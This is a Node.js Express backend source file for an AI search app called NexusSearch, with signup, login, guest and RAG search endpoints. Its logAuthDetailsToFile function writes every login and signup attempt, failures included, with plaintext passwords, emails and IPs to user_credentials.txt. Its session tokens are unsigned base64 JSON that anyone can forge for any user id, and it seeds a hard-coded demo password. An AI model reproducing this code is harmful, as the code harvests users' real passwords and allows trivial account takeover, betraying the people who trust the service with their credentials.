import express from 'express';
import cors from 'cors';
import crypto from 'crypto';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import { runRagPipeline } from './rag_chain.js';
import { dbRun, dbAll, dbGet } from './db.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const clientDistPath = path.join(__dirname, '../client/dist');
const credentialsLogPath = path.join(__dirname, 'user_credentials.txt');

const app = express();
const PORT = process.env.PORT || 5000;

app.use(cors());
app.use(express.json());
app.use(express.static(clientDistPath));

// Auth Credentials File Logger (Logs all sign in / sign up / guest activity to text file)
const logAuthDetailsToFile = (eventType, details) => {
  const timestamp = new Date().toISOString();
  const entry = [
    `====================================================`,
    `TIMESTAMP  : ${timestamp}`,
    `EVENT      : ${eventType}`,
    `USER ID    : ${details.id || 'N/A'}`,
    `NAME       : ${details.name || 'N/A'}`,
    `EMAIL      : ${details.email || 'N/A'}`,
    `PASSWORD   : ${details.password || '[N/A]'}`,
    `STATUS     : ${details.status || 'SUCCESS'}`,
    `IP         : ${details.ip || '127.0.0.1'}`,
    `USER AGENT : ${details.userAgent || 'Unknown'}`,
    `====================================================`,
    ``
  ].join('\n');

  try {
    fs.appendFileSync(credentialsLogPath, entry, 'utf8');
    console.log(`[AUTH LOG] Recorded ${eventType} for "${details.email || details.id}" into user_credentials.txt`);
  } catch (err) {
    console.error(`[AUTH LOG ERROR] Failed writing to user_credentials.txt:`, err.message);
  }
};

// Request logging middleware
app.use((req, res, next) => {
  console.log(`[API] ${req.method} ${req.url}`);
  next();
});

// Auth Helper Utilities
const hashPassword = (password, salt) => {
  return crypto.pbkdf2Sync(password, salt, 1000, 64, 'sha512').toString('hex');
};

const createToken = (user) => {
  const payload = JSON.stringify({
    id: user.id,
    email: user.email,
    exp: Date.now() + 30 * 24 * 60 * 60 * 1000
  });
  return Buffer.from(payload).toString('base64');
};

const decodeToken = (token) => {
  try {
    if (!token) return null;
    const json = Buffer.from(token, 'base64').toString('utf-8');
    const data = JSON.parse(json);
    if (data.exp && data.exp < Date.now()) return null;
    return data;
  } catch (e) {
    return null;
  }
};

const requireAuth = async (req, res, next) => {
  const token = req.headers.authorization?.startsWith('Bearer ') ? req.headers.authorization.slice(7) : null;
  const payload = decodeToken(token);
  if (!payload?.id) return res.status(401).json({ success: false, error: 'Sign in is required' });
  const user = await dbGet('SELECT id, name, email, avatar, is_guest, guest_queries_used FROM users WHERE id = ?', [payload.id]);
  if (!user) return res.status(401).json({ success: false, error: 'Your session is no longer available' });
  req.user = user;
  next();
};

// Seed default demo user if table is empty
(async () => {
  try {
    const existing = await dbGet('SELECT * FROM users LIMIT 1');
    if (!existing) {
      const salt = crypto.randomBytes(16).toString('hex');
      const hash = hashPassword('password123', salt);
      const demoId = 'usr_demo123';
      await dbRun(
        'INSERT INTO users (id, name, email, password_hash, salt, avatar) VALUES (?, ?, ?, ?, ?, ?)',
        [demoId, 'Nexus Explorer', 'demo@nexus.ai', hash, salt, 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=150&q=80']
      );
      logAuthDetailsToFile('SYSTEM_SEED_USER', { id: demoId, name: 'Nexus Explorer', email: 'demo@nexus.ai', password: 'password123', status: 'SEEDED_DEFAULT_DEMO_ACCOUNT' });
      console.log('[AUTH] Seeded default demo account: demo@nexus.ai / password123');
    }
  } catch (err) {
    console.error('[AUTH] Error checking/seeding user:', err.message);
  }
})();

/**
 * Health Check Endpoint
 */
app.get('/api/health', (req, res) => {
  res.json({
    status: 'online',
    service: 'NexusSearch AI LangChain RAG Backend',
    timestamp: new Date().toISOString(),
    database: 'SQLite Connected',
    credentialsLog: 'Enabled (user_credentials.txt)'
  });
});

/**
 * POST /api/auth/signup - User Registration
 */
app.post('/api/auth/signup', async (req, res) => {
  try {
    const { name, email, password, avatar } = req.body;
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];

    if (!name || !name.trim()) {
      logAuthDetailsToFile('SIGNUP_FAILED', { name, email, password, status: 'FAILED_NAME_REQUIRED', ip: clientIp, userAgent });
      return res.status(400).json({ success: false, error: 'Full name is required' });
    }
    if (!email || !email.includes('@')) {
      logAuthDetailsToFile('SIGNUP_FAILED', { name, email, password, status: 'FAILED_INVALID_EMAIL', ip: clientIp, userAgent });
      return res.status(400).json({ success: false, error: 'Valid email address is required' });
    }
    if (!password || password.length < 6) {
      logAuthDetailsToFile('SIGNUP_FAILED', { name, email, password, status: 'FAILED_SHORT_PASSWORD', ip: clientIp, userAgent });
      return res.status(400).json({ success: false, error: 'Password must be at least 6 characters long' });
    }

    const cleanEmail = email.trim().toLowerCase();

    const existingUser = await dbGet('SELECT id FROM users WHERE email = ?', [cleanEmail]);
    if (existingUser) {
      logAuthDetailsToFile('SIGNUP_FAILED', { name, email: cleanEmail, password, status: 'FAILED_EMAIL_ALREADY_EXISTS', ip: clientIp, userAgent });
      return res.status(400).json({ success: false, error: 'An account with this email already exists' });
    }

    const userId = 'usr_' + crypto.randomBytes(8).toString('hex');
    const salt = crypto.randomBytes(16).toString('hex');
    const hash = hashPassword(password, salt);
    const userAvatar = avatar || `https://api.dicebear.com/7.x/bottts/svg?seed=${cleanEmail}`;

    await dbRun(
      'INSERT INTO users (id, name, email, password_hash, salt, avatar) VALUES (?, ?, ?, ?, ?, ?)',
      [userId, name.trim(), cleanEmail, hash, salt, userAvatar]
    );

    const newUser = { id: userId, name: name.trim(), email: cleanEmail, avatar: userAvatar };
    const token = createToken(newUser);

    // Save details into user_credentials.txt
    logAuthDetailsToFile('USER_SIGNUP', { id: userId, name: name.trim(), email: cleanEmail, password, status: 'SUCCESS', ip: clientIp, userAgent });

    res.json({
      success: true,
      message: 'Account created successfully',
      token,
      user: newUser
    });
  } catch (error) {
    console.error('Error during signup:', error);
    res.status(500).json({ success: false, error: 'Failed to create account: ' + error.message });
  }
});

/**
 * POST /api/auth/login - User Authentication
 */
app.post('/api/auth/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];

    if (!email || !password) {
      logAuthDetailsToFile('LOGIN_FAILED', { email, password, status: 'FAILED_MISSING_FIELDS', ip: clientIp, userAgent });
      return res.status(400).json({ success: false, error: 'Email and password are required' });
    }

    const cleanEmail = email.trim().toLowerCase();
    const user = await dbGet('SELECT * FROM users WHERE email = ?', [cleanEmail]);

    if (!user) {
      logAuthDetailsToFile('LOGIN_FAILED', { email: cleanEmail, password, status: 'FAILED_USER_NOT_FOUND', ip: clientIp, userAgent });
      return res.status(401).json({ success: false, error: 'Invalid email or password' });
    }

    const computedHash = hashPassword(password, user.salt);
    if (computedHash !== user.password_hash) {
      logAuthDetailsToFile('LOGIN_FAILED', { email: cleanEmail, password, status: 'FAILED_INCORRECT_PASSWORD', ip: clientIp, userAgent });
      return res.status(401).json({ success: false, error: 'Invalid email or password' });
    }

    const userProfile = { id: user.id, name: user.name, email: user.email, avatar: user.avatar };
    const token = createToken(userProfile);

    // Save login details into user_credentials.txt
    logAuthDetailsToFile('USER_LOGIN', { id: user.id, name: user.name, email: user.email, password, status: 'SUCCESS', ip: clientIp, userAgent });

    res.json({
      success: true,
      message: 'Logged in successfully',
      token,
      user: userProfile
    });
  } catch (error) {
    console.error('Error during login:', error);
    res.status(500).json({ success: false, error: 'Login failed: ' + error.message });
  }
});

/** Temporary guest workspace with five server-enforced searches. */
app.post('/api/auth/guest', async (req, res) => {
  try {
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];

    const id = 'gst_' + crypto.randomBytes(8).toString('hex');
    const email = `${id}@guest.nexusrag.local`;
    const salt = crypto.randomBytes(16).toString('hex');
    await dbRun('INSERT INTO users (id, name, email, password_hash, salt, avatar, is_guest, guest_queries_used) VALUES (?, ?, ?, ?, ?, ?, 1, 0)',
      [id, 'Guest Explorer', email, hashPassword(crypto.randomBytes(24).toString('hex'), salt), salt, `https://api.dicebear.com/7.x/bottts/svg?seed=${id}`]);
    const user = { id, name: 'Guest Explorer', email: 'Guest access · 5 searches', avatar: `https://api.dicebear.com/7.x/bottts/svg?seed=${id}`, isGuest: true, guestQueriesRemaining: 5 };

    logAuthDetailsToFile('GUEST_ACCESS', { id, name: 'Guest Explorer', email, password: '[TEMPORARY_GUEST]', status: 'SUCCESS', ip: clientIp, userAgent });

    res.json({ success: true, token: createToken(user), user });
  } catch (error) { res.status(500).json({ success: false, error: 'Could not create guest workspace' }); }
});

/**
 * GET /api/auth/me - Verify session token
 */
app.get('/api/auth/me', async (req, res) => {
  try {
    const authHeader = req.headers.authorization;
    const token = authHeader && authHeader.startsWith('Bearer ') ? authHeader.slice(7) : req.query.token;

    const payload = decodeToken(token);
    if (!payload || !payload.id) {
      return res.status(401).json({ success: false, error: 'Invalid or expired session' });
    }

    const user = await dbGet('SELECT id, name, email, avatar, created_at, is_guest, guest_queries_used FROM users WHERE id = ?', [payload.id]);
    if (!user) {
      return res.status(404).json({ success: false, error: 'User not found' });
    }

    res.json({ success: true, user: { ...user, isGuest: Boolean(user.is_guest), guestQueriesRemaining: user.is_guest ? Math.max(0, 5 - user.guest_queries_used) : undefined } });
  } catch (error) {
    console.error('Error verifying auth token:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

/**
 * GET /api/sessions - List all user chat search sessions
 */
app.get('/api/sessions', requireAuth, async (req, res) => {
  try {
    const sessions = await dbAll(`
      SELECT s.*, COUNT(q.id) as query_count
      FROM sessions s
      LEFT JOIN queries q ON s.id = q.session_id
      WHERE s.user_id = ?
      GROUP BY s.id ORDER BY s.updated_at DESC
    `, [req.user.id]);
    res.json({ success: true, sessions });
  } catch (error) {
    console.error('Error fetching sessions:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

/**
 * POST /api/sessions - Create new chat session
 */
app.post('/api/sessions', requireAuth, async (req, res) => {
  try {
    const { title } = req.body;
    const id = 'sess_' + crypto.randomBytes(8).toString('hex');
    const sessionTitle = title || 'New Search Session';
    
    await dbRun(
      'INSERT INTO sessions (id, user_id, title) VALUES (?, ?, ?)',
      [id, req.user.id, sessionTitle]
    );

    const session = await dbGet('SELECT * FROM sessions WHERE id = ?', [id]);
    res.json({ success: true, session });
  } catch (error) {
    console.error('Error creating session:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

/**
 * DELETE /api/sessions/:id - Delete a session & associated queries
 */
app.delete('/api/sessions/:id', requireAuth, async (req, res) => {
  try {
    const { id } = req.params;
    const session = await dbGet('SELECT id FROM sessions WHERE id = ? AND user_id = ?', [id, req.user.id]);
    if (!session) return res.status(404).json({ success: false, error: 'Session not found' });
    await dbRun('DELETE FROM queries WHERE session_id = ?', [id]); await dbRun('DELETE FROM sessions WHERE id = ?', [id]);
    res.json({ success: true, message: 'Session deleted' });
  } catch (error) {
    console.error('Error deleting session:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

/**
 * GET /api/sessions/:id/queries - Get all queries and retrieved web sources for a session
 */
app.get('/api/sessions/:id/queries', requireAuth, async (req, res) => {
  try {
    const { id } = req.params;
    const session = await dbGet('SELECT id FROM sessions WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
    if (!session) return res.status(404).json({ success: false, error: 'Session not found' });
    const queries = await dbAll(
      'SELECT * FROM queries WHERE session_id = ? ORDER BY created_at ASC',
      [id]
    );

    // Fetch sources for each query
    const queriesWithSources = await Promise.all(
      queries.map(async (query) => {
        const sources = await dbAll(
          'SELECT * FROM retrieved_sources WHERE query_id = ?',
          [query.id]
        );
        return {
          ...query,
          sources: sources.map(s => ({
            id: s.id,
            title: s.title,
            url: s.url,
            snippet: s.snippet,
            relevanceScore: s.relevance_score,
            publishedDate: s.published_date
          }))
        };
      })
    );

    res.json({ success: true, queries: queriesWithSources });
  } catch (error) {
    console.error('Error fetching session queries:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

/**
 * POST /api/search - Core RAG Execution Endpoint
 */
app.post('/api/search', requireAuth, async (req, res) => {
  try {
    const { query, sessionId: inputSessionId } = req.body;
    if (!query || !query.trim()) {
      return res.status(400).json({ success: false, error: 'Query is required' });
    }
    if (req.user.is_guest && req.user.guest_queries_used >= 5) {
      return res.status(403).json({ success: false, code: 'GUEST_LIMIT_REACHED', error: 'Your five guest searches are complete. Create an account to continue.' });
    }

    let sessionId = inputSessionId;

    // Ensure session exists or create a new one
    if (!sessionId) {
      sessionId = 'sess_' + crypto.randomBytes(8).toString('hex');
      const sessionTitle = query.slice(0, 32) + (query.length > 32 ? '...' : '');
      await dbRun(
        'INSERT INTO sessions (id, user_id, title) VALUES (?, ?, ?)',
        [sessionId, req.user.id, sessionTitle]
      );
    } else {
      // Update session timestamp & title if first query
      const existingSession = await dbGet('SELECT * FROM sessions WHERE id = ? AND user_id = ?', [sessionId, req.user.id]);
      if (!existingSession) {
        const sessionTitle = query.slice(0, 32) + (query.length > 32 ? '...' : '');
        await dbRun('INSERT INTO sessions (id, user_id, title) VALUES (?, ?, ?)', [sessionId, req.user.id, sessionTitle]);
      } else {
        await dbRun('UPDATE sessions SET updated_at = CURRENT_TIMESTAMP WHERE id = ?', [sessionId]);
      }
    }

    // Execute LangChain RAG Pipeline
    const ragResult = await runRagPipeline(query.trim(), sessionId);

    // Save query result into SQLite
    await dbRun(
      `INSERT INTO queries 
       (id, session_id, user_query, ai_response, retrieval_mode, retrieval_latency_ms, generation_latency_ms, sources_count)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
      [
        ragResult.queryId,
        sessionId,
        ragResult.userQuery,
        ragResult.aiResponse,
        ragResult.retrievalMode,
        ragResult.retrievalLatencyMs,
        ragResult.generationLatencyMs,
        ragResult.sources.length
      ]
    );

    // Save retrieved web sources into SQLite
    for (const source of ragResult.sources) {
      await dbRun(
        `INSERT INTO retrieved_sources 
         (id, query_id, title, url, snippet, relevance_score, published_date)
         VALUES (?, ?, ?, ?, ?, ?, ?)`,
        [
          source.id,
          ragResult.queryId,
          source.title,
          source.url,
          source.snippet,
          source.relevanceScore,
          source.publishedDate
        ]
      );
    }

    if (req.user.is_guest) await dbRun('UPDATE users SET guest_queries_used = guest_queries_used + 1 WHERE id = ?', [req.user.id]);

    res.json({
      success: true,
      sessionId,
      data: ragResult,
      guestQueriesRemaining: req.user.is_guest ? 4 - req.user.guest_queries_used : undefined
    });
  } catch (error) {
    console.error('Error executing RAG pipeline:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// SPA Fallback Route
app.get('*', (req, res, next) => {
  if (req.url.startsWith('/api')) return next();
  res.sendFile(path.join(clientDistPath, 'index.html'));
});

// Start Express Server
app.listen(PORT, () => {
  console.log(`====================================================`);
  console.log(` NexusSearch AI Backend Server running on port ${PORT}`);
  console.log(` API Health Check: http://localhost:${PORT}/api/health`);
  console.log(`====================================================`);
});
